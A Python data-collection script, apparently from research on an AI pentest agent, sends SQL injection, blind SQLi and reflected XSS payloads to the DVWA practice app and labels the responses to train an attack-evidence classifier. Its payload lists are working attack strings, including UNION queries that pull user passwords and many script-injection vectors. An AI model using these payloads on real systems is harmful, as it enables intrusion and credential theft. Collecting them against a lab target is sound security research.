"""M1 data-collection for N3 (attack-evidence oracle). plan9.md N3 / M0_inventory.md.

Fires a DIVERSE payload corpus at DVWA (SQLi, boolean-blind SQLi, reflected XSS) across
low/medium/high, records the FULL observation (body, status, timing) plus a per-scenario
BASELINE, and labels each sample with an INDEPENDENT oracle (NOT the N3 model, NOT the
regex interpret_* that N3 will be compared against):

  - SQLi (union/error): UNION sentinel echoed back -> confirmed; SQL error marker ->
    injection_point_error; else no_observed_effect.
  - boolean-blind: DVWA prints "User ID exists" (true) / "MISSING" (false) -> blind_bit_*;
    neither -> no_observed_effect / error.
  - reflected XSS: payload echoed UNESCAPED (tag intact) -> reflected_unescaped (injection
    point evidence); HTML-encoded -> filtered(html_encoded); absent -> filtered(stripped).
    (N3 predicts EVIDENCE of reflection, not browser execution; execution is a separate
    independent verifier used only in the agent experiment, not for these labels.)

No LLM is used -- this is cheap, deterministic, and read-only (SELECT/boolean/reflection
payloads only; no destructive SQL). Output: data/n3_raw.jsonl (+ body excerpt) and
data/n3_dataset.csv (features + labels + group=scenario_id) for M2 training.

Usage: python eval/collect_n3_data.py
"""
from __future__ import annotations
import sys, json, csv, html, difflib
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from src.orchestrator import Scenario, load_config          # noqa: E402
from src.action.http_client import DvwaClient               # noqa: E402

OUT_DIR = ROOT / "data"; OUT_DIR.mkdir(exist_ok=True)
RAW = OUT_DIR / "n3_raw.jsonl"
CSV = OUT_DIR / "n3_dataset.csv"

SENTINEL = "ZQX7"   # unique token for UNION-extraction confirmation
_SQL_ERR = ("You have an error in your SQL syntax", "supplied argument is not a valid MySQL",
            "mysql_fetch", "SQLSTATE", "Unknown column", "Warning: mysql")

# ---- payload corpora (read-only). intended_* is a HINT; final label = oracle ----

def sqli_payloads():
    cols = ["1", "2", "3"]
    cmt = [" -- ", " #", "-- ", ""]
    pos = [f"1' OR '1'='1{c}" for c in cmt] + [f"' OR '1'='1{c}" for c in cmt] + \
          ["1 OR 1=1", "1 OR 1=1 -- ", "1' OR 1=1 #", "admin' -- ", "admin'#",
           "1' or 1=1 -- ", "1'||'1'='1"]
    union = [f"1' UNION SELECT '{SENTINEL}','{SENTINEL}2'{c}" for c in cmt] + \
            [f"' UNION SELECT '{SENTINEL}',version(){c}" for c in cmt] + \
            [f"1 UNION SELECT '{SENTINEL}','{SENTINEL}2'",
             f"1' UNION SELECT user,password FROM users -- ",
             f"-1' UNION SELECT '{SENTINEL}',database() -- "]
    err = ["1'", "1''", "1' OR", "'", "1' UNION SELECT 1 -- ", "1' AND (SELECT 1 FROM dual) -- ",
           "1' UNION SELECT 1,2,3 -- ", "1' ORDER BY 9 -- ", "1\"", "1' GROUP BY 99 -- ",
           "1' UNION SELECT 1 FROM users -- "]
    benign = ["1", "2", "3", "0", "abc", "1 ", "id", "5", "test", "100", "-1"]
    enc = ["1%27%20OR%20%271%27%3D%271", "1&#39; OR &#39;1&#39;=&#39;1", "1%27", "1%27%20--%20"]
    return [("confirm", p) for p in pos + union] + [("error", p) for p in err] + \
           [("benign", p) for p in benign] + [("encoded", p) for p in enc]

def blind_payloads():
    true_p = ["1' AND '1'='1", "1' AND 1=1 -- ", "1 AND 1=1", "1' AND '1'='1' -- ",
              "1' OR '1'='1", "1' AND (SELECT 1)=1 -- ", "1' AND 2>1 -- ", "1' AND 'a'='a",
              "1' AND LENGTH(database())>0 -- ", "1' AND 1=1#", "1' and 1=1 -- "]
    false_p = ["1' AND '1'='2", "1' AND 1=2 -- ", "1 AND 1=2", "1' AND '1'='2' -- ",
               "1' AND (SELECT 1)=2 -- ", "1' AND 2<1 -- ", "1' AND 'a'='b",
               "1' AND 1=2#", "1' and 1=2 -- ", "999' AND 1=1 -- "]
    benign = ["1", "2", "999", "abc", "0", "3", "test", "-5"]
    err = ["1'", "'", "1' AND", "1' AND (SELECT", "1\"", "1' OR"]
    return [("true", p) for p in true_p] + [("false", p) for p in false_p] + \
           [("benign", p) for p in benign] + [("error", p) for p in err]

def xss_payloads():
    raw = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
           "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<a href=javascript:alert(1)>x</a>",
           "<ScRiPt>alert(1)</ScRiPt>", "<img src=x onerror=prompt(1)>", "<details open ontoggle=alert(1)>",
           "<marquee onstart=alert(1)>", "<video><source onerror=alert(1)>", "<input onfocus=alert(1) autofocus>",
           "<select onfocus=alert(1) autofocus>", "<img/src/onerror=alert(1)>", "<svg/onload=alert(1)>"]
    stripped_target = ["<script>alert(1)</script>", "<SCRIPT>alert(1)</SCRIPT>", "<script src=x></script>"]
    benign = ["hello", "test name", "John", "a<b", "plain123", "Mozart", "normal text", "12345"]
    enc_probe = ["<b>bold</b>", "\"'><tag>", "<i>x</i>", "<h1>y</h1>"]
    return [("raw", p) for p in raw] + [("raw", p) for p in stripped_target] + \
           [("benign", p) for p in benign] + [("probe", p) for p in enc_probe]

CORPUS = {"sqli": sqli_payloads, "sqli_blind": blind_payloads, "xss_reflected": xss_payloads}


def send(client: DvwaClient, sc: Scenario, value: str):
    if sc.session_input_endpoint:
        return client.send_via_session_input(sc.session_input_endpoint, sc.endpoint, sc.param, value,
                                             extra_params=sc.extra_params)
    if sc.cookie_param:
        return client.send_via_cookie(sc.endpoint, sc.cookie_param, value)
    return client.send_param(sc.method, sc.endpoint, sc.param, value, extra_params=sc.extra_params)


def oracle(family: str, body: str, payload: str) -> tuple[str, str]:
    """Return (outcome_label, filter_label) from INDEPENDENT ground truth."""
    low = body.lower()
    has_err = any(m.lower() in low for m in _SQL_ERR)
    if family == "sqli":
        if SENTINEL.lower() in low:
            return "confirmed", "none"                 # UNION extraction echoed sentinel
        # >1 distinct user record = data beyond the single expected row
        rows = low.count("first name")
        if rows >= 2:
            return "confirmed", "none"
        if has_err:
            return "injection_point_error", "none"
        return "no_observed_effect", "unknown"
    if family == "sqli_blind":
        exists = "user id exists" in low or "exists in the database" in low
        missing = "missing from the database" in low or "user id is missing" in low
        if exists and not missing:
            return "blind_bit_true", "none"
        if missing:
            return "blind_bit_false", "none"
        if has_err:
            return "injection_point_error", "none"
        return "no_observed_effect", "unknown"
    # reflected XSS: evidence of reflection class (NOT execution)
    if "<" in payload and payload in body:
        return "reflected_unescaped", "none"
    escaped = html.escape(payload, quote=False)
    if escaped in body or payload.replace("<", "&lt;").replace(">", "&gt;") in body:
        return "no_observed_effect", "html_encoded"
    if "<" in payload:          # tag present in payload but neither raw nor encoded found
        return "no_observed_effect", "token_stripped"
    return "no_observed_effect", "unknown"


def features(family: str, level: str, payload: str, resp, baseline_len: int, baseline_body: str) -> dict:
    body = resp.body
    low = body.lower()
    # cheap char-diff ratio on truncated bodies (fast, stable)
    a, b = baseline_body[:4000], body[:4000]
    diff_ratio = difflib.SequenceMatcher(None, a, b).quick_ratio() if a or b else 1.0
    esc = html.escape(payload, quote=False)
    return {
        "status": resp.status_code,
        "body_len": len(body),
        "elapsed_ms": round(resp.elapsed_s * 1000, 1),
        "delta_len": len(body) - baseline_len,
        "char_diff_ratio": round(diff_ratio, 4),
        "has_sql_error": int(any(m.lower() in low for m in _SQL_ERR)),
        "has_exists": int("exists in the database" in low or "user id exists" in low),
        "has_missing": int("missing from the database" in low),
        "reflected_raw": int("<" in payload and payload in body),
        "reflected_encoded": int(esc in body and esc != payload),
        "sentinel_echo": int(SENTINEL.lower() in low),
        "rows_firstname": low.count("first name"),
        "payload_len": len(payload),
        "p_quote": int("'" in payload or "%27" in payload.lower() or "&#39;" in payload),
        "p_angle": int("<" in payload),
        "p_union": int("union" in payload.lower()),
        "p_comment": int("--" in payload or "#" in payload),
        "p_tautology": int("1=1" in payload or "'1'='1" in payload),
        "p_false": int("1=2" in payload or "'1'='2" in payload),
        "level_ord": {"low": 0, "medium": 1, "high": 2}[level],
        "fam_sqli": int(family == "sqli"),
        "fam_blind": int(family == "sqli_blind"),
        "fam_xss": int(family == "xss_reflected"),
    }


def main():
    cfg = load_config(str(ROOT / "config.yaml"))
    t = cfg["target"]
    scens = [Scenario.from_dict(d) for d in __import__("yaml").safe_load(
        open(ROOT / "eval/scenarios.yaml", encoding="utf-8"))["scenarios"]
        if d.get("vuln_type") in CORPUS]

    raw_f = open(RAW, "w", encoding="utf-8")
    rows = []
    for sc in scens:
        client = DvwaClient(base_url=t["base_url"], allowlist=t["allowlist"],
                            username=t["login_user"], password=t["login_pass"],
                            security_level=sc.level)
        client.login()
        base_val = "1"
        base_resp = send(client, sc, base_val)
        base_len, base_body = base_resp.length, base_resp.body
        n = 0
        for intended, payload in CORPUS[sc.vuln_type]():
            try:
                resp = send(client, sc, payload)
            except Exception as e:                       # noqa: BLE001
                print("  !", sc.id, repr(payload)[:40], "->", e); continue
            outcome, filt = oracle(sc.vuln_type, resp.body, payload)
            feat = features(sc.vuln_type, sc.level, payload, resp, base_len, base_body)
            rec = {"scenario": sc.id, "family": sc.vuln_type, "level": sc.level,
                   "payload": payload, "intended": intended,
                   "outcome": outcome, "filter_type": filt,
                   # 2000-char excerpt: MUST match runtime N3Oracle embedding length
                   # (audit GPT 2026-10-18 -- train/runtime embedding contract).
                   "features": feat, "body_excerpt": resp.body[:2000]}
            raw_f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            row = {"scenario": sc.id, "family": sc.vuln_type, "level": sc.level,
                   "payload": payload, "outcome": outcome, "filter_type": filt, **feat}
            rows.append(row); n += 1
        print(f"  {sc.id}: {n} samples")
    raw_f.close()

    # CSV for training
    cols = list(rows[0].keys())
    with open(CSV, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=cols); w.writeheader(); w.writerows(rows)

    # quick label distribution
    from collections import Counter
    print("\nTOTAL samples:", len(rows))
    print("outcome dist:", dict(Counter(r["outcome"] for r in rows)))
    print("filter dist :", dict(Counter(r["filter_type"] for r in rows)))
    print("per family  :", dict(Counter(r["family"] for r in rows)))
    print("wrote", RAW, "and", CSV)


if __name__ == "__main__":
    main()
